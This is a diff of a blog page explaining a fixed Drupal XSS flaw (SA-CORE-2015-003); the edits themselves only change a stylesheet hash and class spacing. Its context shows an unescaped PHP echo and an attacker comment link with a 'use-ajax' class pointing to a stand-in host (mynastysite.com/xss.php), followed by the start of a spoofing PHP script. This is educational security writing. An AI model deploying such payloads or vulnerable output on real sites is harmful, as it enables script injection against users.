@@ -27,7 +27,7 @@
     <link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://mortenson.coffee/feed.xml" />
     <title>Getting creative with Drupal XSS | Samuel Mortenson</title>
     <link rel="stylesheet" media="all" href="/sites/default/files/css/css_qnsgUxQ4erflh2KqIxND38FL4G26caA293zq4F12u-k.css" />
-<link rel="stylesheet" media="all" href="/sites/default/files/css/css_GyaoY3McooiEJeQ0hQpV5i2_Gdnn7uVDGKjZiosKrsY.css" />
+<link rel="stylesheet" media="all" href="/sites/default/files/css/css_aJtxriRLrEwAZyO9ZA7uY_urt5YbrE8-bENSChMdo1o.css" />
 
     
 <!--[if lte IE 8]>
@@ -61,13 +61,13 @@
 <p>Drupal developers are mostly protected from XSS by the HTML filtering system, but custom code can still allow attacks using unconventional exploits.</p>
 <p>For a simple web application, finding an XSS vulnerability may seem trivial. Looking at online resources, you often find code snippets like this:</p>
 <figure><pre>
-<code data-lang="php" class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Search results for "<span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $_GET[<span class="hljs-string">'q'</span>]; <span class="hljs-meta">?&gt;</span></span>":<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></code></pre></figure><p>but now-a-days, finding an exploit this obvious is unlikely, unless you’re looking at something completely hand-built. Drupal 8 makes code like this is even more unlikely, given that the templating system has moved to Twig, which escapes output by default and does not allow arbitrary PHP statements.</p>
+<code data-lang="php" class=" hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Search results for "<span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $_GET[<span class="hljs-string">'q'</span>]; <span class="hljs-meta">?&gt;</span></span>":<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></code></pre></figure><p>but now-a-days, finding an exploit this obvious is unlikely, unless you’re looking at something completely hand-built. Drupal 8 makes code like this is even more unlikely, given that the templating system has moved to Twig, which escapes output by default and does not allow arbitrary PHP statements.</p>
 <p>So what kind of Drupal code can trigger XSS? Let’s look at a practical example based on <a href="https://www.drupal.org/SA-CORE-2015-003">SA-CORE-2015-003</a>, which was a security release I helped out on.</p>
 <p><em>Note: The following exploit has already been fixed, don’t freak out!</em></p>
 <p>Drupal has an internal AJAX system that responds to events on HTML elements, reaching out to a JSON endpoint to perform what’s known as AJAX commands. An example of this is the autocomplete element, which triggers AJAX requests as a user types to determine autocomplete suggestions.</p>
 <p>You can enhance your HTML elements with this behavior like so:</p>
 <figure><pre>
-<code data-lang="javascript" class="hljs css"><span class="hljs-selector-tag">Drupal</span><span class="hljs-selector-class">.ajax</span>({
+<code data-lang="javascript" class=" hljs css"><span class="hljs-selector-tag">Drupal</span><span class="hljs-selector-class">.ajax</span>({
   <span class="hljs-attribute">url</span>: <span class="hljs-string">'/foo'</span>,
   event: <span class="hljs-string">'click'</span>,
   element: $(<span class="hljs-string">'#my-great-link'</span>),
@@ -79,10 +79,10 @@
 <li>The AJAX system automatically binds on elements with the “use-ajax” class</li>
 </ol><p>Knowing this, we can make a comment like this:</p>
 <figure><pre>
-<code data-lang="html" class="hljs javascript">&lt;a href=<span class="hljs-string">"http://mynastysite.com/xss.php"</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">"use-ajax"</span>&gt;Click me!<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre></figure><p>and know that when the link is clicked, a POST request is made to an arbitrary URL, and Drupal will parse the response and process AJAX commands.</p>
+<code data-lang="html" class=" hljs javascript">&lt;a href=<span class="hljs-string">"http://mynastysite.com/xss.php"</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">"use-ajax"</span>&gt;Click me!<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre></figure><p>and know that when the link is clicked, a POST request is made to an arbitrary URL, and Drupal will parse the response and process AJAX commands.</p>
 <p>The xss.php script on our endpoint could look something like this:</p>
 <figure><pre>
-<code data-lang="php" class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>
+<code data-lang="php" class=" hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>
 
 <span class="hljs-comment">// Only display the spoof response if the method is POST, this way normal users</span>
 <span class="hljs-comment">// (i.e. non-admins) will see a normal page.</span>
@@ -107,7 +107,7 @@
 </ol><p>This has been fixed for about two years, but it’s a great example of how complex XSS vulnerabilities in Drupal can be.</p>
 <p>My biggest takeaway from this is that <em>you don’t need to bypass the XSS filter to trigger XSS.</em> Get creative with your research, and don’t hope to find quick-win exploits in code like:</p>
 <figure><pre>
-<code data-lang="twig" class="hljs twig"><span class="hljs-template-variable">{{ twig_input | raw }}</span></code></pre></figure><p>because it’s unlikely that you’ll get that lucky. 😁</p>
+<code data-lang="twig" class=" hljs twig"><span class="hljs-template-variable">{{ twig_input | raw }}</span></code></pre></figure><p>because it’s unlikely that you’ll get that lucky. 😁</p>
 </div>
       
     </div>
